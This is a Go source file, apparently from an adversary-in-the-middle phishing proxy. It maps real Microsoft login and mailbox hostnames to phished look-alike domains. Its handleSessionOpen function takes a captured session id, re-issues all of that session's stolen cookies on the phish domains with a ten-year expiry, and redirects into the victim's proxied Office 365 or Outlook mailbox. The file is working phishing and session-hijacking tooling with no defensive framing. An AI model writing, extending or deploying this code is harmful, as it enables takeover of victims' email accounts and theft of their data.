package core

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// __sess_open capability URLs: anyone holding a sid can replay that session.
// buildOrigToPhishMap maps original hostnames (login.microsoftonline.com) to
// their phished equivalents (loq.example.com) for every enabled phishlet.
func (p *HttpProxy) buildOrigToPhishMap() map[string]string {
	m := map[string]string{}
	for site, pl := range p.cfg.phishlets {
		if !p.cfg.IsSiteEnabled(site) {
			continue
		}
		pdomain, ok := p.cfg.GetSiteDomain(pl.Name)
		if !ok {
			continue
		}
		for _, ph := range pl.proxyHosts {
			orig := combineHost(ph.orig_subdomain, ph.domain)
			phish := combineHost(ph.phish_subdomain, pdomain)
			if orig != "" && phish != "" {
				m[orig] = phish
			}
		}
	}
	return m
}

// handleSessionOpen builds a 302 response that sets every captured cookie for
// the session on its matching phish domain, then redirects into the mailbox.
func (p *HttpProxy) handleSessionOpen(sid string) *http.Response {
	sess, err := p.db.GetSessionBySid(sid)
	if err != nil || sess == nil {
		return nil
	}

	hdr := http.Header{}
	n := 0

	if len(sess.CookieTokens) > 0 {
		m := p.buildOrigToPhishMap()
		exp := time.Now().Add(10 * 365 * 24 * time.Hour)
		for domain, tmap := range sess.CookieTokens {
			lookup := strings.TrimPrefix(domain, ".")
			// Cookie domains are often parent domains (".office365.com") while the
			// proxy host is a subdomain ("outlook.office365.com"). Do a suffix match
			// so the cookie is set on the deepest matching phish host.
			host, ok := m[lookup]
			if !ok {
				for orig, phish := range m {
					if orig == lookup || strings.HasSuffix(orig, "."+lookup) {
						host = phish
						ok = true
						break
					}
				}
			}
			if !ok {
				continue
			}
			for name, tok := range tmap {
				v := strings.TrimSpace(tok.Value)
				if v == "" || strings.EqualFold(v, "DELETE") || strings.EqualFold(v, "deleted") {
					continue
				}
				c := &http.Cookie{
					Name:     name,
					Value:    v,
					Domain:   host,
					Path:     tok.Path,
					HttpOnly: tok.HttpOnly,
					Secure:   true,
					Expires:  exp,
				}
				if c.Path == "" {
					c.Path = "/"
				}
				hdr.Add("Set-Cookie", c.String())
				n++
			}
		}
	}

	if n == 0 {
		return nil
	}

	// Prefer a proxied mailbox surface as the redirect target.
	pickTarget := func(suffixes ...string) string {
		for _, want := range suffixes {
			for orig, phish := range p.buildOrigToPhishMap() {
				if strings.HasSuffix(orig, want) {
					return "https://" + phish + "/"
				}
			}
		}
		return ""
	}
	target := pickTarget("cloud.microsoft", "office365.com", "office.com", "outlook.com", "microsoftonline.com")
	if target == "" {
		// fall back to the phishlet's landing host
		m2 := p.buildOrigToPhishMap()
		for _, pl := range p.cfg.phishlets {
			if pd, ok := p.cfg.GetSiteDomain(pl.Name); ok && pd != "" {
				if _, exists := m2[pd]; !exists {
					target = "https://" + pd + "/"
					break
				}
			}
		}
	}
	if target == "" {
		return nil
	}

	hdr.Set("Location", target)
	hdr.Set("Cache-Control", "no-store")
	return &http.Response{
		StatusCode:    http.StatusFound,
		Status:        fmt.Sprintf("%d %s", http.StatusFound, http.StatusText(http.StatusFound)),
		ProtoMajor:    1,
		ProtoMinor:    1,
		Header:        hdr,
		Body:          io.NopCloser(strings.NewReader("")),
		ContentLength: 0,
	}
}
